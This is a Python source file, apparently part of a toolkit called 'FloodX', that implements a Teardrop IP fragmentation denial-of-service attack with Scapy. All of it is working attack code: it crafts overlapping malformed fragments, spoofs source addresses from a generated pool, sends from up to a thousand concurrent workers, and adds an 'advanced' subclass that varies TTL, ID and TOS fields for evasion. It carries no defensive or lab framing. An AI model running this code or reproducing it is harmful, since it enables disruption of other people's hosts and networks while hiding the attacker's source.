"""
FloodX: Teardrop Fragmentation Attack
High-performance IP fragmentation attack to consume target resources.
"""

import asyncio
import random
import socket
import struct
import time
from typing import Dict, Any, Optional
from datetime import datetime

try:
    from scapy.all import IP, Raw, send, fragment
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from common.logger import logger, stats_logger


class TeardropFlooder:
    """High-performance Teardrop fragmentation attack implementation."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config.get('port', 80)
        self.duration = config.get('duration', 60)
        self.concurrency = config.get('concurrency', 1000)
        self.spoof_ip = config.get('spoof_ip', False)
        self.advanced = config.get('advanced', False)
        
        self.running = False
        self.packets_sent = 0
        self.errors = 0
        self.active_workers = 0
        
        # Performance optimization
        self.packet_cache = []
        self.spoof_ips = []
        
    async def run(self):
        """Main attack execution."""
        if not SCAPY_AVAILABLE:
            logger.error("❌ Scapy not available. Install with: pip install scapy")
            return
            
        logger.info(f"💥 Starting Teardrop attack on {self.target}:{self.port}")
        logger.info(f"   Duration: {self.duration}s, Workers: {self.concurrency}")
        
        # Initialize statistics
        stats_logger.update_stats(
            target=f"{self.target}:{self.port}",
            vector="teardrop",
            status="running"
        )
        stats_logger.start_real_time_logging()
        
        try:
            # Pre-generate packets for performance
            await self._prepare_attack()
            
            self.running = True
            
            # Launch worker tasks
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._teardrop_worker(i))
                tasks.append(task)
            
            # Run for specified duration
            await asyncio.sleep(self.duration)
            self.running = False
            
            # Wait for workers to finish
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ Teardrop attack failed: {e}")
            stats_logger.increment_errors()
        finally:
            stats_logger.stop_real_time_logging()
            stats_logger.update_stats(status="completed")
            logger.info(f"✅ Teardrop attack completed: {self.packets_sent} packets sent")
    
    async def _prepare_attack(self):
        """Pre-generate attack packets for better performance."""
        logger.info("⚙️  Preparing fragmented packets...")
        
        # Generate spoofed IP pool if enabled
        if self.spoof_ip:
            self.spoof_ips = self._generate_spoofed_ips(1000)
            logger.info(f"🎭 Generated {len(self.spoof_ips)} spoofed IP addresses")
        
        # Pre-generate packet templates
        for _ in range(100):  # Cache 100 packet templates
            packet = self._create_teardrop_packet()
            if packet:
                self.packet_cache.append(packet)
        
        logger.info(f"📦 Cached {len(self.packet_cache)} packet templates")
    
    def _generate_spoofed_ips(self, count: int) -> list:
        """Generate random spoofed IP addresses."""
        ips = []
        for _ in range(count):
            # Generate random private/public IPs
            if random.choice([True, False]):
                # Private IP ranges
                ranges = [
                    (10, 0, 0, 0, 8),      # 10.0.0.0/8
                    (172, 16, 0, 0, 12),   # 172.16.0.0/12
                    (192, 168, 0, 0, 16)   # 192.168.0.0/16
                ]
                base = random.choice(ranges)
                if base[4] == 8:
                    ip = f"{base[0]}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                elif base[4] == 12:
                    ip = f"{base[0]}.{random.randint(base[1], base[1]+15)}.{random.randint(1,254)}.{random.randint(1,254)}"
                else:
                    ip = f"{base[0]}.{base[1]}.{random.randint(1,254)}.{random.randint(1,254)}"
            else:
                # Random public IP (avoid reserved ranges)
                while True:
                    ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    if not ip.startswith(('10.', '172.', '192.168.', '127.', '224.', '240.')):
                        break
            ips.append(ip)
        return ips
    
    def _create_teardrop_packet(self) -> Optional[tuple]:
        """Create a malformed fragmented packet (Teardrop attack)."""
        try:
            # Create base packet with large payload
            payload_size = random.randint(1400, 8000)  # Large payload to force fragmentation
            payload = Raw('X' * payload_size)
            
            # Choose source IP
            src_ip = random.choice(self.spoof_ips) if self.spoof_ip and self.spoof_ips else None
            
            # Create IP packet
            if src_ip:
                packet = IP(dst=self.target, src=src_ip) / payload
            else:
                packet = IP(dst=self.target) / payload
            
            # Fragment the packet
            fragments = fragment(packet, fragsize=8)  # Very small fragments
            
            if len(fragments) >= 2:
                # Malform the fragments to create overlapping/conflicting fragments
                frag1, frag2 = fragments[0], fragments[1]
                
                # Modify fragment offsets to create the "teardrop" effect
                # This causes overlapping fragments that confuse reassembly
                frag2[IP].frag = frag1[IP].frag + 2  # Overlapping offset
                frag2[IP].flags = 1  # More fragments flag
                
                return (frag1, frag2, payload_size)
            
            return None
            
        except Exception as e:
            logger.debug(f"Failed to create teardrop packet: {e}")
            return None
    
    async def _teardrop_worker(self, worker_id: int):
        """Individual worker that sends teardrop packets."""
        self.active_workers += 1
        stats_logger.set_active_threads(self.active_workers)
        
        packets_this_worker = 0
        
        try:
            while self.running:
                try:
                    # Get packet from cache or create new one
                    if self.packet_cache:
                        fragments = random.choice(self.packet_cache)
                    else:
                        fragments = self._create_teardrop_packet()
                    
                    if fragments:
                        frag1, frag2, payload_size = fragments
                        
                        # Send fragments with short delay to increase confusion
                        await asyncio.get_event_loop().run_in_executor(
                            None, self._send_fragment, frag1
                        )
                        await asyncio.sleep(0.001)  # 1ms delay
                        await asyncio.get_event_loop().run_in_executor(
                            None, self._send_fragment, frag2
                        )
                        
                        # Update statistics
                        self.packets_sent += 2
                        packets_this_worker += 2
                        stats_logger.increment_packets(2, payload_size)
                        
                        # Rate limiting for sustainability
                        if self.advanced:
                            await asyncio.sleep(random.uniform(0.01, 0.05))
                        else:
                            await asyncio.sleep(0.02)
                    
                    else:
                        await asyncio.sleep(0.1)  # Wait if packet creation failed
                        
                except Exception as e:
                    self.errors += 1
                    stats_logger.increment_errors()
                    await asyncio.sleep(0.1)
                    
        except asyncio.CancelledError:
            pass
        finally:
            self.active_workers -= 1
            stats_logger.set_active_threads(self.active_workers)
            logger.debug(f"Worker {worker_id} sent {packets_this_worker} packets")
    
    def _send_fragment(self, fragment):
        """Send a packet fragment using Scapy."""
        try:
            send(fragment, verbose=False, iface=None)
        except Exception as e:
            logger.debug(f"Failed to send fragment: {e}")
            raise


class AdvancedTeardropFlooder(TeardropFlooder):
    """Advanced Teardrop implementation with additional evasion techniques."""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.evasion_techniques = config.get('evasion_techniques', [])
    
    def _create_teardrop_packet(self) -> Optional[tuple]:
        """Create advanced teardrop packet with evasion techniques."""
        try:
            # Base teardrop packet
            fragments = super()._create_teardrop_packet()
            if not fragments:
                return None
            
            frag1, frag2, payload_size = fragments
            
            # Apply evasion techniques
            if 'ttl_variation' in self.evasion_techniques:
                frag1[IP].ttl = random.randint(32, 128)
                frag2[IP].ttl = random.randint(32, 128)
            
            if 'id_variation' in self.evasion_techniques:
                packet_id = random.randint(1, 65535)
                frag1[IP].id = packet_id
                frag2[IP].id = packet_id
            
            if 'tos_variation' in self.evasion_techniques:
                tos = random.choice([0, 0x10, 0x08, 0x04, 0x02])
                frag1[IP].tos = tos
                frag2[IP].tos = tos
            
            return (frag1, frag2, payload_size)
            
        except Exception as e:
            logger.debug(f"Failed to create advanced teardrop packet: {e}")
            return None
